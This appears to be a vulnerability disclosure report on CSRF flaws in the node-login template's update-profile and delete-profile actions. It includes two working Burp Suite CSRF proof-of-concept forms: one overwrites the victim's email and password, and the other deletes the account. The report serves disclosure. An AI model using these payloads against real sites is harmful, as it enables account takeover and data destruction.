# Description

`node-login` is a template for quickly building login systems on top of Node.js & MongoDB. It is vulnerable to CSRF attacks in Update and Delete profile actions

# Proof of Concept

* Navigate to `/signup` and create a victim account

# Update Profile

1. Use the CSRF PoC from Burpsuite
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/home" method="POST">
      <input type="hidden" name="name" value="hacked" />
      <input type="hidden" name="email" value="hacked&#64;test&#46;com" />
      <input type="hidden" name="country" value="Afghanistan" />
      <input type="hidden" name="pass" value="hacked" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
2. Visit the payload link and click submit button
3. The account credentials should have changed to attacker's data now.

# Delete Profile

1. Use the CSRF PoC from Burpsuite
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/delete" method="POST">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
2. Visit the payload link and click submit button
3. The account should have deleted now.